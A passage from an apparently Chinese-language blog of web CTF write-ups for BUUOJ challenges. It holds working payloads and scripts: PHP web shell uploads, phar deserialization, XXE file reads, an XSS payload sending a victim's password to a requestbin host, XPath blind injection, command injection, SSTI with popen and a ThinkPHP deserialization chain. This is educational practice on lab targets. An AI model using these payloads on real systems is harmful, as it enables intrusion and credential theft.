\"/View/{$viewName}.php\";\n\t\tif(file_exists($this->viewPath))\n\t\t{\n\t\t\textract($viewData);//将数组中的内容变为变量\n\t\t\tinclude $this->viewPath;//包含渲染模版\n\t\t}\n\t}\n}\n```\n\n```php\n///View/userIndex\n<?php\n\tif(!isset($img_file)) {\n\t\t$img_file = '/../favicon.ico';\n\t}\n\t$img_dir = dirname(__FILE__) . $img_file;\n\t$img_base64 = imgToBase64($img_dir);\n\techo '<img src=\"' . $img_base64 . '\">';       //任意文件base64编码\n?>\n```\n\n审计完payload就出来了\n\n```\n?r=User/Index&img_file=/../flag.php\n```\n\n图片处读base64解码即可\n\n## [GXYCTF2019]BabysqliV3.0\n\n我tm试了半天你告诉我弱口令？？？？？？？？？？？？？？？？？？？？？？？？/\n\n`admin/password`\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png)\n\n明显的文件读取，伪协议读取\n\n```php\n//upload.php\n<?php\nerror_reporting(0);\nclass Uploader{\n        public $Filename;\n        public $cmd;\n        public $token;\n        function __construct(){\n                $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n                $ext = \".txt\";\n                @mkdir($sandbox, 0777, true);\n                if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n                        $this->Filename = $_GET['name'];\n                }\n                else{\n                        $this->Filename = $sandbox.$_SESSION['user'].$ext;\n                }\n                $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n                $this->token = $_SESSION['user'];\n        }\n        function upload($file){\n                global $sandbox;\n                global $ext;\n                if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n                        $this->cmd = \"die('illegal filename!');\";\n                }\n                else{\n                        if($file['size'] > 1024){\n                                $this->cmd = \"die('you are too big (′▽`〃)');\";\n                        }\n                        else{\n                                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n                        }\n                }\n        }\n        function __toString(){\n                global $sandbox;\n                global $ext;\n                // return $sandbox.$this->Filename.$ext;\n                return $this->Filename;\n        }\n        function __destruct(){\n                if($this->token != $_SESSION['user']){\n                        $this->cmd = \"die('check token falied!');\";\n                }\n                eval($this->cmd);\n        }\n}\nif(isset($_FILES['file'])) {\n        $uploader = new Uploader();\n        $uploader->upload($_FILES[\"file\"]);\n        if(@file_get_contents($uploader)){\n                echo \"下面是你上传的文件：<br>\".$uploader.\"<br>\";\n                echo file_get_contents($uploader);\n        }\n}\n?>\n```\n\n此处有一个file_get_contents存在phar反序列化，任意上传文件可以拿到`$_SESSION['user']`，然后构造exp\n\n```php\n<?php\nerror_reporting(0);\nclass Uploader{\n    public $Filename;\n    public $cmd;\n    public $token;\n}\n$upload=new Uploader();\n$upload->cmd = \"highlight_file('/var/www/html/flag.php');\";\n$upload->token = 'GXY380513e563f39abb95bd589a6d2648ec';\n$phar = new Phar(\"phar.phar\");\n$phar -> startBuffering();\n$phar -> setStub(\"<?php __HALT_COMPILER();?>\");\n$phar -> setMetadata($upload);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar -> stopBuffering();\n?>\n```\n\n上传后将name参数改为`phar:///var/www/html/uploads/da3fd6a2cf9c6007bda4c8a58e394ba2/GXY380513e563f39abb95bd589a6d2648ec.txt`刷新即可拿flag\n\n## [SUCTF 2018]annonymous\n\n源码\n\n```php\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");//创建无名函数\n$hash = bin2hex(openssl_random_pseudo_bytes(32));//生成随机数\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");//给了无名函数一个名字，但是是随机的\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\n> 匿名函数其实是有真正的名字，为%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)\n\n通过上面这个方法，用个脚本就能跑出来\n\n```python\nimport requests\nfor i in range(1,1000):\n    r=requests.get(url=f'http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/?func_name=%00lambda_{i}')\n    print(r.status_code)\n    if 'flag' in r.text:\n        print(r.text)\n        break\n```\n\n## [RoarCTF 2019]Simple Upload\n\n\n\n\n\n```php\n<?php \nnamespace Home\\Controller; \n\nuse Think\\Controller; \n\nclass IndexController extends Controller \n{ \n    public function index() \n    { \n        show_source(__FILE__); \n    } \n    public function upload() \n    { \n        $uploadFile = $_FILES['file'] ; \n         \n        if (strstr(strtolower($uploadFile['name']), \".php\") ) { \n            return false; \n        } \n         \n        $upload = new \\Think\\Upload();// 实例化上传类 \n        $upload->maxSize  = 4096 ;// 设置附件上传大小 \n        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 \n        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录 \n        $upload->savePath = '';// 设置附件上传子目录 \n        $info = $upload->upload() ; \n        if(!$info) {// 上传错误提示错误信息 \n          $this->error($upload->getError()); \n          return; \n        }else{// 上传成功 获取上传文件信息 \n          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; \n          echo json_encode(array(\"url\"=>$url,\"success\"=>1)); \n        } \n    } \n}\n```\n\n1、看源码可以看出来是thinkphp的文件上传，代码中过滤了php文件后缀，而在thinkphp中文件上传的时候会对文件名进行这样的处理\n\n```php\nforeach ($files as $key => $file) {\n    $file['name']  = strip_tags($file['name']);//这里将<>标签删掉\n\t\tif(!isset($file['key']))   $file['key']    =   $key;\n\t\t/* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */\n    if(isset($finfo)){\n        $file['type']   =   finfo_file ( $finfo ,  $file['tmp_name'] );\n    }\n```\n\n所以可以构造如下的payload\n\n```python\nimport  requests\nurl = \"http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/index.php/home/index/upload\"\nfiles={'file':('1.<>php',\"<?php eval($_GET['cmd'])?>\")}\nr=requests.post(url=url,files=files)\nprint(r.text)\n```\n\n2、think PHP里的upload()函数在不传参的情况下是批量上传的，所以如果上传多个文件\n\n```php\n$uploadFile = $_FILES['file'] ;\n\tif (strstr(strtolower($uploadFile['name']), \".php\") ) {\n  \treturn false;\n  }\n```\n\n此处name即为数组，可直接绕过\n\n```python\nimport  requests\nurl = \"http://f2d454a6-807f-4da4-9815-e366f39612d8.node4.buuoj.cn:81/index.php/home/index/upload\"\nfiles = {'file':(\"1.txt\",\"\")}\nfiles2={'file[]':('1.php',\"<?php eval($_GET['cmd'])?>\")}\nr = requests.post(url,files = files)\nprint (r.text)\nr = requests.post(url,files = files2)\nprint (r.text)\nr = requests.post(url,files = files)\nprint (r.text)\n```\n\n继续往下走，发现虽然php文件确实上传成功了，但是并没有返回文件名，看前后两个文件重命名后的内容发现文件名的生成是有规律的，了解后知道文件名是通过uniqid得到的，这是根据当前时间来得到的随机数，那么根据前后两个文件名不同的位置进行爆破即可\n\n## [GoogleCTF2019 Quals]Bnv\n\n选择城市并且进行submit时会向api发送一个json格式的post请求，这里其实就有可能存在XXE注入\n\n在burp中尝试通过xml方式传入原始数据，提示未发现<标签\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png)\n\n按照xml格式构造内容提示没有DTD\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061821510.png)\n\n那我们在放一个DTD进去，提示有未声明的元素消息\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061823346.png)\n\n此处类似于在使用变量前要先对变量进行声明，我们只需要声明一下message元素即可，此时回显正常\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png)\n\n那么下一步我们就要想如何构造才能让flag回显，我们先看是否能读取本地文件，提示文件虽然存在但并不是一个格式良好的xml文件，所以加载中断了，将/flag传入发现回显相同，说明flag文件存在，但是我们怎么读取呢？\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png)\n\n一个利用本地DTD来XXE输出任何文件内容的小[trick](https://mohemiv.com/tags/xxe/)\n\n> 本质上我们可以使用本地DTD文件的实体，但是我们需要在完全加载它之前对它进行定义\n>\n> 而且Linux设备可能在/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。现在我们来制作DTD代码。\n\n所以我们首先尝试放入一个错误的文件位置，可以看到文件名被回显出来了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061843021.png)\n\n所以我们要做的就是构造DTD代码使得读取的文件名是我们实际要读取的文件的内容，使得报错导致实际读取的文件内容被放入虚假的文件名中被爆出\n\n大佬构造出的xml如下\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE message[\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % ISOamso '\n    <!ENTITY &#x25; file SYSTEM \"file:///flag\">\n    <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaaaa/&#x25;file;&#x27;>\">\n    &#x25;eval;\n    &#x25;error;\n'>\n%local_dtd;\n]>\n```\n\n```xml-dtd\n<!DOCTYPE message [\n    <!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\n    <!ENTITY % ISOamso '\n        <!ENTITY % file SYSTEM \"file:///flag\">\n        <!ENTITY % eval \"<!ENTITY % error SYSTEM 'file:///jlan/%file;'>\">\n        %eval;\n        %error;\n    '>\n    %local_dtd;\n]>\n```\n\n\n\n## [GWCTF 2019]mypassword\n\n有反馈，合理怀疑XSS\n\n```php\n\t\tif(is_array($feedback)){\n\t\t\t\techo \"<script>alert('反馈不合法');</script>\";\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t$blacklist = ['_','\\'','&','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];\n\t\t\tforeach ($blacklist as $val) {\n\t\t        while(true){\n\t\t            if(stripos($feedback,$val) !== false){\n\t\t                $feedback = str_ireplace($val,\"\",$feedback);\n\t\t            }else{\n\t\t                break;\n\t\t            }\n\t\t        }\n\t\t    }\n```\n\n构造payload\n\n```javascript\n<incookieput type=\"text\" name=\"username\">\n<incookieput type=\"password\" name=\"password\">\n<scrcookieipt scookierc=\"./js/login.js\"></scrcookieipt>\n<scrcookieipt>\n    var psw = docucookiement.getcookieElementsByName(\"password\")[0].value;\n    docucookiement.locacookietion=\"http://http.requestbin.buuoj.cn/1is06vp1/?a=\"+psw;\n</scrcookieipt>\n```\n\n## [DDCTF 2019]homebrew event loop\n\n欣赏源码\n\n```python\nfrom flask import Flask, session, request, Response\nimport urllib\n\napp = Flask(__name__)\napp.secret_key = '*********************'  # censored\nurl_prefix = '/d5afe1f66147e857'\n\n\ndef FLAG():\n    return '*********************'  # censored\n\n\ndef trigger_event(event):\n    session['log'].append(event)\n    if len(session['log']) > 5:\n        session['log'] = session['log'][-5:]\n    if type(event) == type([]):\n        request.event_queue += event\n    else:\n        request.event_queue.append(event)\n\n\ndef get_mid_str(haystack, prefix, postfix=None):\n    haystack = haystack[haystack.find(prefix)+len(prefix):]\n    if postfix is not None:\n        haystack = haystack[:haystack.find(postfix)]\n    return haystack\n\n\nclass RollBackException:\n    pass\n\n\ndef execute_event_loop():\n    valid_event_chars = set(\n        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')\n    resp = None\n    while len(request.event_queue) > 0:\n        # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\"\n        event = request.event_queue[0]\n        request.event_queue = request.event_queue[1:]\n        if not event.startswith(('action:', 'func:')):\n            continue\n        for c in event:\n            if c not in valid_event_chars:\n                break\n        else:\n            is_action = event[0] == 'a'\n            action = get_mid_str(event, ':', ';')\n            args = get_mid_str(event, action+';').split('#')\n            try:\n                event_handler = eval(\n                    action + ('_handler' if is_action else '_function'))\n                ret_val = event_handler(args)\n            except RollBackException:\n                if resp is None:\n                    resp = ''\n                resp += 'ERROR! All transactions have been cancelled. <br />'\n                resp += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n                session['num_items'] = request.prev_session['num_items']\n                session['points'] = request.prev_session['points']\n                break\n            except Exception, e:\n                if resp is None:\n                    resp = ''\n                # resp += str(e) # only for debugging\n                continue\n            if ret_val is not None:\n                if resp is None:\n                    resp = ret_val\n                else:\n                    resp += ret_val\n    if resp is None or resp == '':\n        resp = ('404 NOT FOUND', 404)\n    session.modified = True\n    return resp\n\n\n@app.route(url_prefix+'/')\ndef entry_point():\n    querystring = urllib.unquote(request.query_string)\n    request.event_queue = []\n    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:\n        querystring = 'action:index;False#False'\n    if 'num_items' not in session:\n        session['num_items'] = 0\n        session['points'] = 3\n        session['log'] = []\n    request.prev_session = dict(session)\n    trigger_event(querystring)\n    return execute_event_loop()\n\n# handlers/functions below --------------------------------------\n\n\ndef view_handler(args):\n    page = args[0]\n    html = ''\n    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(\n        session['num_items'], session['points'])\n    if page == 'index':\n        html += '<a href=\"./?action:index;True%23False\">View source code</a><br />'\n        html += '<a href=\"./?action:view;shop\">Go to e-shop</a><br />'\n        html += '<a href=\"./?action:view;reset\">Reset</a><br />'\n    elif page == 'shop':\n        html += '<a href=\"./?action:buy;1\">Buy a diamond (1 point)</a><br />'\n    elif page == 'reset':\n        del session['num_items']\n        html += 'Session reset.<br />'\n    html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n    return html\n\n\ndef index_handler(args):\n    bool_show_source = str(args[0])\n    bool_download_source = str(args[1])\n    if bool_show_source == 'True':\n\n        source = open('eventLoop.py', 'r')\n        html = ''\n        if bool_download_source != 'True':\n            html += '<a href=\"./?action:index;True%23True\">Download this .py file</a><br />'\n            html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n\n        for line in source:\n            if bool_download_source != 'True':\n                html += line.replace('&', '&amp;').replace('\\t', '&nbsp;'*4).replace(\n                    ' ', '&nbsp;').replace('<', '&lt;').replace('>', '&gt;').replace('\\n', '<br />')\n            else:\n                html += line\n        source.close()\n\n        if bool_download_source == 'True':\n            headers = {}\n            headers['Content-Type'] = 'text/plain'\n            headers['Content-Disposition'] = 'attachment; filename=serve.py'\n            return Response(html, headers=headers)\n        else:\n            return html\n    else:\n        trigger_event('action:view;index')\n\n\ndef buy_handler(args):#增加num_items\n    num_items = int(args[0])\n    if num_items <= 0:\n        return 'invalid number({}) of diamonds to buy<br />'.format(args[0])\n    session['num_items'] += num_items\n    trigger_event(['func:consume_point;{}'.format(\n        num_items), 'action:view;index'])\n\n\ndef consume_point_function(args):\n    point_to_consume = int(args[0])\n    if session['points'] < point_to_consume:\n        raise RollBackException()\n    session['points'] -= point_to_consume\n\n\ndef show_flag_function(args):\n    flag = args[0]\n    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.\n    return 'You naughty boy! ;) <br />'\n\n\ndef get_flag_handler(args):#最终拿flag\n    if session['num_items'] >= 5:\n        # show_flag_function has been disabled, no worries\n        trigger_event('func:show_flag;' + FLAG())\n    trigger_event('action:view;index')\n\n\nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0')\n```\n\n看源码中各个函数的功能，写到注释中了，可以看到如果需要拿flag就要调用`get_flag_handler`，而如果要执行就需要有5个`num_items`，通过`buy_handler`函数来增加`num_items`，但是钱不够，此时我们通过执行`trigger_event`函数来进行多函数执行，在进行扣费之前就拿取到flag\n\n```\n?action:trigger_event#;action:buy;5#action:get_flag;#\n```\n\n此时session已经被写入cookie了，由于该flask程序中并没有使用数据库，所以session中的内容实际上是储存在我们的cookie中（[戳这里看详情](https://www.leavesongs.com/PENETRATION/client-session-security.html)）得到session内容并使用`flask-session-cookie-manager`工具进行解密，拿到flag\n\n## [RootersCTF2019]babyWeb\n\nSQL注入，过滤已提醒`UNION SLEEP ' \" OR - BENCHMARK`\n\n先用order by测出列数，再用万能密码捞出flag\n\n```\n1 || 1=1 limit 0,1\n```\n\n## [HFCTF2020]BabyUpload\n\n源码先扔\n\n```php\n<?php\nerror_reporting(0);\nsession_save_path(\"/var/babyctf/\");\nsession_start();\nrequire_once \"/flag\";\nhighlight_file(__FILE__);\nif($_SESSION['username'] ==='admin')\n{\n    $filename='/var/babyctf/success.txt';\n    if(file_exists($filename)){\n            safe_delete($filename);\n            die($flag);\n    }\n}\nelse{\n    $_SESSION['username'] ='guest';\n}\n$direction = filter_input(INPUT_POST, 'direction');\n$attr = filter_input(INPUT_POST, 'attr');\n$dir_path = \"/var/babyctf/\".$attr;\nif($attr===\"private\"){\n    $dir_path .= \"/\".$_SESSION['username'];\n}\nif($direction === \"upload\"){\n    try{\n        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){\n            throw new RuntimeException('invalid upload');\n        }\n        $file_path = $dir_path.\"/\".$_FILES['up_file']['name'];\n        $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']);\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        @mkdir($dir_path, 0700, TRUE);\n        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){\n            $upload_result = \"uploaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $upload_result = $e->getMessage();\n    }\n} elseif ($direction === \"download\") {\n    try{\n        $filename = basename(filter_input(INPUT_POST, 'filename'));\n        $file_path = $dir_path.\"/\".$filename;\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        if(!file_exists($file_path)) {\n            throw new RuntimeException('file not exist');\n        }\n        header('Content-Type: application/force-download');\n        header('Content-Length: '.filesize($file_path));\n        header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"');\n        if(readfile($file_path)){\n            $download_result = \"downloaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $download_result = $e->getMessage();\n    }\n    exit;\n}\n?>\n```\n\n新知识：可以通过上传session文件伪造session\n\n> **对于通过文件存储session的，不同的引擎存储方式有以下几种**\n>\n> php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n> php:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n> php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值\n\n看代码，拿到flag的条件是，`$_SESSION['username'] ==='admin'`并且`/var/babyctf/success.txt`文件存在或`/var/babyctf/success.txt/`目录存在，首先尝试读取session文件判断session存储类型\n\n```\n\\x08usernames:5:\"guest\";\n```\n\n说明是php_binary方式存储的，下一步就是伪造session文件了，题目中文件上传后会被重命名为`文件名+_+文件内容的sha256计算后的内容`，编写脚本进行上传\n\n```python\nimport hashlib\nfrom io import BytesIO\nimport requests\n\nurl = 'http://650ec886-b0bc-410f-bb3c-0b8dda942bee.node4.buuoj.cn:81/index.php'\n# 第一步:上传伪造的session文件\nfiles = {\"up_file\": (\"sess\", BytesIO('\\x08usernames:5:\"admin\";'.encode('utf-8')))}\ndata = {\n    'direction': 'upload',\n    'attr': ''\n}\nres = requests.post(url, data=data, files=files)\n\n# 第二步:获取后面请求时的session_id\nsession_id = hashlib.sha256('\\x08usernames:5:\"admin\";'.encode('utf-8')).hexdigest()\n\n# 第三步:在/var/babyctf/下创建success.txt目录\ndata1 = {\n    'attr': 'success.txt',\n    'direction': 'upload'\n}\nres1 = requests.post(url=url, data=data1, files=files)\n\n# 第四步:通过上面获取的session_id发起请求，获取flag\ncookie = {\n    'PHPSESSID': session_id\n}\nflag_res = requests.post(url, cookies=cookie)\nprint(flag_res.text)\n```\n\n## [NPUCTF2020]ezlogin\n\nXXE是你吗XXE\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png)\n\n尝试了一遍发现不是，看wp是[XPath注入](https://www.tr0y.wang/2019/05/11/XPath注入指北/)，还有一个[盲注](https://xz.aliyun.com/t/7791)\n\nXPath中表示内容的方法（类似Linux中的文件结构）\n\n```\n/ 根节点\n/* 根结点下所有子节点\n//*所有节点\n/root/* 根结点root下的所有子节点\n```\n\n一些好用的XPath函数\n\n```\ncount 返回结果的数量\nstring-length 返回字符串长度\nname 返回节点名称\nsubstring 同MySQL中substr的用法\n\n```\n\n本题给个大佬脚本\n\n```python\nimport requests\nimport re\nimport time\n \nsession = requests.session()\nurl = \"http://391bfefa-8949-4535-8129-07c86723c6b9.node4.buuoj.cn\"\nchars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\nhead = {\n    #'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36',\n    'Content-Type': 'application/xml',\n    #\"Cookie\":\"UM_distinctid=1785326510411f-0b3fb285b5c49c-4c3f227c-144000-178532651052c9; session=b953d436-f0da-4e58-be79-22676707c609.K5TbTAnwLyhIU66duiTX1Usn1D8; PHPSESSID=dd258b30ebc3b42c352a92ed98092b1c\"\n        }\n \nfind = re.compile(r'<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />',re.S)\nresult = \"\"\n#猜测根节点名称\npayload_1 = \"<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#猜测子节点名称\npayload_2 = \"<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#猜测accounts的节点\npayload_3 =\"<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#猜测user节点\npayload_4 =\"<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n#跑用户名和密码\npayload_username =\"<username>'or substring(/root/accounts/user[2]/username/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\npayload_password =\"<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>\"\n \ndef get_token():     #获取token的函数\n    resp = session.get(url=url)  #如果在这里用headers会得到超时的界面\n    token = find.findall(resp.text)[0]\n    #print(token)\n    return token\n \nfor x in range(1,100):\n    for char in chars:\n        time.sleep(0.3)\n        token = get_token()\n        playload = payload_username.format(x, char, token)   #根据上面的playload来改\n        #print(playload)\n        resp = session.post(url=url,headers=head, data=playload)\n        #print(resp.text)\n        if \"非法操作\" in resp.text:\n            result += char\n            print(result)\n            break\n    if \"用户名或密码错误\" in resp.text:\n        break\n```\n\n跑出结果为adm1n和md5解密后为gtfly123，登录成功，发现传参中含有文件参数，尝试php伪协议读取，被拦截，大小写绕过，读取/flag\n\n## EasyBypass\n\n源码\n\n```php\n<?php\n\nhighlight_file(__FILE__);\n\n$comm1 = $_GET['comm1'];\n$comm2 = $_GET['comm2'];\n\n\nif(preg_match(\"/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is\", $comm1))\n    $comm1 = \"\";\nif(preg_match(\"/\\'|\\\"|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is\", $comm2))\n    $comm2 = \"\";\n\n$flag = \"#flag in /flag\";\n\n$comm1 = '\"' . $comm1 . '\"';\n$comm2 = '\"' . $comm2 . '\"';\n\n$cmd = \"file $comm1 $comm2\";\nsystem($cmd);\n?>\n```\n\n命令1，2过滤内容并不相同，命令1中过滤较少，直接从这边下手，首先双引号闭合，分号结束命令，tac读取文件，通配符匹配文件，最终payload如下\n\n```\n?comm1=\";tac /f*;\"\n```\n\n## [2020 新春红包题]1\n\n这题和**[EIS 2019]EzPOP**完全一致，唯一不同就是在文件名处多了过滤\n\n```php\n    public function getCacheKey(string $name): string {\n        // 使缓存文件名随机\n        $cache_filename = $this->options['prefix'] . uniqid() . $name;\n        if(substr($cache_filename, -strlen('.php')) === '.php') {\n          die('?');\n        }\n        return $cache_filename;\n    }\n```\n\n此处我们可以使用伪协议加目录穿越来绕过，传入`key = \"/../shell.php/.\";`且`options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';`，此时内容变为：`php://filter/write=convert.base64-decode/resource=62a58e2e23e33/../shell.php`直接绕过\n\n## [羊城杯2020]easyphp\n\n文件上传.htaccess包含利用，首先在htaccess文件中是有注释符的，就它#，但是php不读这个的啊，那么我们就上传.htaccess文件并包含htaccess并且注释掉一句话木马即可，末尾记得加反斜杠来转译换行，file使用\\来绕过\n\n```\n php_value auto_prepend_fil\n \\e .htaccess\n #<?php system('tac /f*');?>\\\n```\n\n## [XNUCA2019Qualifier]EasyPHP\n\n这个非预期和上面那个一样，也是传入htaccess文件执行\n\n## [pasecactf_2019]flask_ssti\n\n过滤了'，.，_，使用16进制绕过，直接给payload了\n\n```\nnickname={{()[\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fbases\\x5f\\x5f\"][0][\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]()[127][\"\\x5f\\x5finit\\x5f\\x5f\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"popen\"](\"tac app*\")[\"read\"]()}}\n```\n\n但是很明显看到源码也没啥用，因为flag已经被销毁了\n\n```python\nimport random\nfrom flask import Flask, render_template_string, render_template, request\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'\n\n#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe\n'''\ndef encode(line, key, key2):\n    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))\n\napp.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')\n'''\n\ndef encode(line, key, key2):\n    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))\n\nfile = open(\"/app/flag\", \"r\")\nflag = file.read()\nflag = flag[:42]\n\napp.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')\nflag = \"\"\n\nos.remove(\"/app/flag\")\n```\n\n使用这个函数反向跑出flag即可\n\n## [安洵杯 2019]iamthinking\n\nwww.zip下载源码\n\n```php\n<?php\nnamespace app\\controller;\nuse app\\BaseController;\n\nclass Index extends BaseController\n{\n    public function index()\n    {\n        \n        echo \"<img src='../test.jpg'\".\"/>\";\n        $paylaod = @$_GET['payload'];\n        if(isset($paylaod))\n        {\n            $url = parse_url($_SERVER['REQUEST_URI']);\n            parse_str($url['query'],$query);\n            foreach($query as $value)\n            {\n                if(preg_match(\"/^O/i\",$value))\n                {\n                    die('STOP HACKING');\n                    exit();\n                }\n            }\n            unserialize($paylaod);\n        }\n    }\n}\n```\n\n可以看到这里有个反序列化，没有其他的方法了，只能看thinkPHP的反序列化漏洞了，至于其中的对第一个匹配的绕过，看[这里](https://www.cnblogs.com/tr1ple/p/11137159.html)，其中thinkPHP的反序列化链子可以用[这个](https://github.com/wh1t3p1g/phpggc)工具生成\n\n最终payload\n\n```\n//public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%